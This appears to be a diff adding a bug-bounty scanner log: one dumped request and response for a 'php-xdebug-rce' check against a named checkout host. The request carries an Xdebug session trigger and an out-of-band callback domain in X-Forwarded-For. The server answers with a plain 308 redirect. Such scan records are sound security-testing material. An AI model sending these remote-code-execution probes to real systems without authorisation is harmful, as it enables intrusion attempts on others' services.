@@ -1,0 +1,29 @@
+[php-xdebug-rce] Dumped HTTP request for http://checkout.bitpanda.com/?XDEBUG_SESSION_START=30ruvwskGBBLpqNuyfm2WB0wxFf
+
+
+GET /?XDEBUG_SESSION_START=30ruvwskGBBLpqNuyfm2WB0wxFf HTTP/1.1
+Host: checkout.bitpanda.com
+User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50
+Connection: close
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+X-Forwarded-For: d28vs52us8n0rrg3ds80qhu9psjzb6ct3.oast.me
+Accept-Encoding: gzip
+
+
+[php-xdebug-rce] Dumped HTTP response http://checkout.bitpanda.com/?XDEBUG_SESSION_START=30ruvwskGBBLpqNuyfm2WB0wxFf
+
+HTTP/1.1 308 Permanent Redirect
+Connection: close
+Content-Length: 164
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:50:46 GMT
+Location: https://checkout.bitpanda.com/?XDEBUG_SESSION_START=30ruvwskGBBLpqNuyfm2WB0wxFf
+
+<html>
+<head><title>308 Permanent Redirect</title></head>
+<body>
+<center><h1>308 Permanent Redirect</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
